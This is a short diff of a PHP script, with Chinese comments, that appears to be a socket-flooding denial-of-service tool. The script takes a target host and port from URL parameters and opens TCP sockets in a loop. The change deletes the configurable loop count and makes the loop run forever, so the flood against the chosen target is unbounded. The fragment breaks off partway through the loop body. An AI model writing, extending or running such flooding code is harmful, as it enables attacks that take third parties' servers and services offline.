@@ -4,10 +4,9 @@ set_time_limit(0);     //设定一个程式所允许执行的秒数   0 是无�
 ob_implicit_flush();     // 刷新输出缓冲
 $address = $_GET['site'];  // 网站地址
 $port = $_GET['port'];      // 端口
-$dongu = $_GET['dongu'];   //循环次数
 $sayi = 1;
 
-while ( $sayi <= $dongu )   //变量asyi小于 循环次数变量 dongu 才会继续循环
+while ( true )   
 {
 	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
 		echo "HaHa\n";
